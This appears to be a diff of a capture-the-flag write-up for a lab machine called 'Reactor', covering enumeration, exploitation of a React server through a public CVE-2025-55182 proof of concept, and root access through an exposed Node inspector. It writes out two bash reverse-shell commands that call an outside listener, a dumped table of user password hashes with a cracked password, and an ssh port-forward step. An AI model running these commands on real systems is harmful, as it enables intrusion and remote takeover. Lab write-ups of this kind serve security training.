@@ -1,17 +1,40 @@
 [Profile]{
 Machine: Reactor 
-ip: 
+ip: 10.129.245.214
 }
 
 [Enumeration]{
 
+nmap like usual 
+got ssh on 22, service on 3000 ( React server apparently )
+
 }
 
 [Exploitation]{
+https://github.com/msanft/CVE-2025-55182.git then you run poc.py target cmd
+That could be your way to reverse shell.
+Yeah, it is:
+└──╼ $python CVE-2025-55182/poc.py http://10.129.245.214:3000/ 'bash -c "bash -i >& /dev/tcp/10.10.16.28/4444 0>&1"'
+
+From reactor.db, we got this:
+sqlite> select * from users;
+1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
+when cracked, we got engineer:reactor1 and admin:
+Then su engineer, we type the password we got, and ... we are in !
+And we got the user.txt !
 
 }
 
 [PrivEsc]{
+ps aux | grep node
+root        1240  0.0  1.2 1066320 47872 ?       Ssl  13:10   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+Now we have to get this inspector to execute command and get root access.
+port forwarding through ssh -L 9229:127.0.0.1:9229 engineer@10.129.245.214 and the password reactor1 we previously got.
+Then go to dev tools on any way you want and get the inspector then run a script to get a reverse shell as root.
+A way is on Chromium, tap chrome://inspect, then on remote target you will it see coming and going. Catch it.
+Then require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.16.28/7777 0>&1"');
+And you got your reverse shell on your nc -lvnp 7777 that you obviously set up. right !? ))
 
-
+And that's it !
 }
